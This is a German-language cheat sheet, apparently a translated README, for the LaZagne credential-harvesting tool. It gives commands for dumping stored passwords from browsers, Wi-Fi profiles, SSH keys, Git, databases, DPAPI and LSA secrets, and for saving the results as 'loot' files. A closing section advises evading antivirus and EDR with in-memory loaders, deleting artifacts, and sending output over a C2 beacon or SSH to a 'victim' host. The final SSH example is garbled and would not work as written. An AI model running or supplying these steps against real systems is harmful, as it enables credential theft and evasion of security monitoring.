<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# LaZagne-Spickzettel

[LaZagne](https://github.com/AlessandroZ/LaZagne) ist eine Open-Source-Post-Exploitation-Anwendung, die zum Abrufen von auf einem lokalen Computer gespeicherten Passwörtern verwendet wird. Es unterstützt Windows, Linux und macOS in mehreren Kategorien, darunter Webbrowser, E-Mail-Clients, Wi-Fi-Netzwerke, Datenbankverwaltungssoftware, Systemadministrator-Tools und Speichercaches.

---

## Inhaltsverzeichnis

- [Unterstützte Module und Kategorien](#supported-modules--categories)
- [Installation & Binärdateien](#installation--binaries)
- [Linux Credential Harvesting](#linux-credential-harvesting)
- [Windows Credential Harvesting](#windows-credential-harvesting)
- [Gezielte Kategorieangriffe](#targeted-category-attacks)
- [Ausgabeformate und Dateiexport](#output-formats--file-export)
- [Betriebssicherheit und EDR-Vermeidung](#operational-security--edr-avoidance)

---

## Unterstützte Module und Kategorien

LaZagne extrahiert Anmeldeinformationen aus Dutzenden von Anwendungen, die in Kategorien gruppiert sind:
- **Browser:** Chrome, Firefox, Edge, Opera, Brave, Chromium (Verlauf, automatisches Ausfüllen, Cookies, Anmeldeinformationen).
- **Sysadmin-Tools:** WinSCP, PuTTY, OpenSSH (`id_rsa`-Schlüssel/Konfiguration), RDP/mstsc, FileZilla, Cyberduck, VNC.
- **Datenbanken:** DBeaver, pgAdmin, Squirrel, Robomongo, SQL Server Management Studio.
- **Wi-Fi:** Gespeicherte WPA2/WPA3-Pre-Shared-Keys (PSK) in Betriebssystem-Netzwerkprofilen.
- **Entwickler und VCS:** Git-Anmeldeinformationen (`.git-credentials`, Cache), SVN, Docker-Tokens, AWS CLI-Anmeldeinformationen.
- **E-Mail und Chat:** Thunderbird, Outlook, Pidgin, Skype.
- **Windows Vault und DPAPI:** LSA-Geheimnisse, DPAPI-Hauptschlüssel, Credential Manager-Tresorelemente.

---

## Installation und Binärdateien
```bash
# Clone the repository
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZagne

# Install Python dependencies (for running source on Linux)
pip install -r requirements.txt

# Or download pre-compiled standalone binaries (releases page)
# Windows: lazagne.exe
# Linux: laZagne.py
```
---

## Sammeln von Linux-Anmeldeinformationen

### 1. Führen Sie alle Extraktionsmodule aus
```bash
python3 laZagne.py all
```
### 2. Mit Root-/Sudo-Berechtigungen ausführen (erweitert Shadow- und Schlüsselbundzugriff)
Die Ausführung als `root` schaltet Systemgeheimnisse, Wi-Fi-Profile in `/etc/NetworkManager` und SSH-Schlüssel in allen `/home/*`-Verzeichnissen frei:
```bash
sudo python3 laZagne.py all
```
### 3. Passwörter aus Gnome-Schlüsselbund / KWallet extrahieren
```bash
python3 laZagne.py sysadmin -k
```
---

## Sammeln von Windows-Anmeldeinformationen

Verwenden Sie unter Windows die eigenständige ausführbare Datei `lazagne.exe`:

### 1. Extrahieren Sie alle gespeicherten Passwörter
```cmd
lazagne.exe all
```
### 2. Mit erhöhten Rechten ausführen (Admin / SYSTEM)
Extrahieren Sie DPAPI-Hauptschlüssel, LSA-Geheimnisse und zwischengespeicherte Domänenanmeldeinformationen:
```cmd
lazagne.exe all -v
```
### 3. Passwörter für einen bestimmten Benutzer extrahieren (bei Ausführung als Administrator)
```cmd
lazagne.exe all -path "C:\Users\TargetUser\AppData"
```
---

## Gezielte Kategorieangriffe

Anstatt alle Module auszuführen, geben Sie Zielsoftwarekategorien an, um Festplattenaktivität und Lärm zu minimieren:

### 1. Nur Webbrowser
```bash
# Linux
python3 laZagne.py browsers

# Windows
lazagne.exe browsers
```
### 2. WLAN-Klartext-Passwörter
```bash
# Linux (requires root or sudo)
sudo python3 laZagne.py wifi

# Windows
lazagne.exe wifi
```
### 3. Sysadmin- und Fernzugriffstools (SSH, RDP, WinSCP, FileZilla)
```bash
# Linux
python3 laZagne.py sysadmin

# Windows
lazagne.exe sysadmin
```
### 4. Datenbank-Clients
```bash
# Linux
python3 laZagne.py databases

# Windows
lazagne.exe databases
```
### 5. Entwickler- und Git-Anmeldeinformationen
```bash
# Linux
python3 laZagne.py git
```
---

## Ausgabeformate und Dateiexport

Speichern Sie gesammelte Anmeldeinformationen in strukturierten Formaten direkt auf der Festplatte:

### Export in das JSON-Format
```bash
python3 laZagne.py all -oJ -oN /tmp/loot_credentials
```
Erstellt `/tmp/loot_credentials.json` mit strukturierten Anmeldeinformationen, URLs, Benutzernamen und Klartext-Passwörtern.

### In einfachen Text exportieren
```bash
python3 laZagne.py all -oT -oN /tmp/loot_credentials
```
Erstellt `/tmp/loot_credentials.txt`.

---

## Betriebssicherheit und EDR-Vermeidung

- **Antivirus-Erkennung:** Der eigenständige `lazagne.exe` ist stark von Windows Defender und kommerziellen EDR-Lösungen signiert.
- **Verschleierung und In-Memory-Ausführung:**
  - Ausführung über PowerShell Reflection oder In-Memory-Loader (`donut`, `execute-assembly` in Cobalt Strike/Sliver).
  – Verwenden Sie die Python-Quellversion mit einer benutzerdefinierten virtuellen Umgebung anstelle der gepackten PyInstaller-Binärdatei.
- **Artefakte bereinigen:** Löschen Sie temporäre Beutedateien oder leiten Sie die Ausgabe direkt über den Standardausgang über einen verschlüsselten C2-Beacon oder eine SSH-Sitzung um:
  ```bash
  ssh victim@192.168.1.50 'python3 -' < laZagne.py all
  ```